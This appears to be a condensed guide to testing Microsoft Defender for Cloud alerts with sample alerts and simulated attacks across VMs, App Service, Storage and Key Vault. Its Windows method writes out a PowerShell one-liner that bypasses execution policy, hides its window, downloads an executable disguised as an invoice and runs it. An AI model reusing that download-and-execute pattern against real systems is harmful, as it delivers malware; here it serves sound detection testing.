# Defender for Cloud Alert Validation & Simulation Guide

> Source: https://learn.microsoft.com/azure/defender-for-cloud/alert-validation

## Overview
How to validate that Defender for Cloud is properly configured for security alerts, using sample alerts and simulated attacks.

## Prerequisites
- Machines and connected Log Analytics workspaces must be in the same tenant
- Subscription Contributor role required for creating sample alerts

## Method 1: Generate Sample Alerts (Portal)
1. From security alerts page toolbar → **Sample alerts**
2. Select subscription
3. Select relevant Defender plan(s)
4. Click **Create sample alerts**
5. Alerts appear in ~10 minutes in Alerts blade + connected SIEMs/email

## Method 2: Simulate on Azure VMs (Windows)
1. Requires MDE agent installed (Defender for Servers integration)
2. Open elevated Command Prompt
3. Run: `powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\test-MDATP-test\invoice.exe');Start-Process 'C:\test-MDATP-test\invoice.exe'`
4. Alert appears in ~10 minutes
5. **Prerequisite**: Defender for Endpoint Real-Time protection must be enabled

Alternative: Use EICAR test string — create text file, paste EICAR, save as .exe

## Method 3: Simulate on Azure VMs (Linux)
1. MDE agent required
2. Run: `curl -O https://secure.eicar.org/eicar.com.txt`
3. Alert appears in ~10 minutes
4. Real-Time protection must be enabled

## Method 4: Kubernetes
- Use the Kubernetes alerts simulation tool
- Tests control plane (API server) and containerized workload alerts

## Method 5: App Service
1. Create or use existing website (wait 24h for new sites)
2. Access: `https://<website>.azurewebsites.net/This_Will_Generate_ASC_Alert`
3. Alert generated in 2-4 hours

## Method 6: Storage ATP
1. Navigate to storage account with Defender for Storage enabled
2. Upload a file to a container
3. Generate SAS URL for the uploaded file
4. Access SAS URL from Tor browser
5. Alert generated after some time

## Method 7: Key Vault
1. Create Key Vault + secret
2. From a VM with internet, install Tor browser
3. Access Key Vault URL via Tor browser (authenticate)
4. Browse Secrets section
5. Sign out and close Tor
6. Defender for Key Vault triggers alert

## 21V Applicability
- Sample alert generation works in 21V (Mooncake)
- MDE simulation requires MDE availability in 21V
- Some Defender plans may not be available in 21V — check support matrix
